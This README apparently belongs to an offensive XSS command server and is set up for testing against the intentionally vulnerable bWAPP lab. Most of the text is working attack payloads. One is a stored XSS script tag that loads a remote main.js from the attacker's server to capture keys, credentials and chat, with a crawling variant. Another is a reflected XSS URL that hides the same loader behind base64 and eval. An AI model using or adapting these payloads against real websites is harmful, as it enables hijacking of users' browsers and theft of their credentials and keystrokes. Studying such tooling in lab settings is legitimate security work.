# xss_server

How to test:
1) docker run -d -p 80:80 digitalpipelines/bwapp-docker
2) git clone https://github.com/chickenidol/xss_server.git
3) cd xss_server/docker && mkdir db && docker build -t test:xss_server . --no-cache
4) docker run -ti -v $(pwd)/db:/xss_server/client/db  -p 8000:80 test:xss_server



1) Stored XSS, keys, creds, chat
	1.1) Place blog message:
		Hi, nice blog!
		<script>
			let client_id = `someid`
			const urlParams = new URLSearchParams(window.location.search);
			const linkId = urlParams.get(`linkId`)

			if (linkId)
				client_id = linkId

			let main_script = document.createElement(`script`)
			main_script.src = `http://127.0.0.1:8000/main.js/` + client_id
			document.body.appendChild(main_script)
		</script>

	1.2) Open link:
http://127.0.0.1/xss_stored_1.php либо http://127.0.0.1/xss_stored_1.php?linkId=wefwe

2) Stored XSS, keys, creds, chat, crawl
	2.1) iframe.src = "http://127.0.0.1/";
	2.2) const HOST_TO_CRAWL = "127.0.0.1"
	2.3) uncomment block in crawl.js

3) Reflected. 

http://127.0.0.1/xss_get.php?firstname=%3Cscript%3Eeval(atob(`dmFyIHU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7dS5zcmM9Imh0dHA6Ly8xMjcuMC4wLjE6ODAwMC9tYWluLmpzL2V3ZmV3ZndlZiI7ZG9jdW1lbnQuYm9keS5hcHBlbmQodSk7`))%3C%2Fscript%3E&lastname=test&form=submit

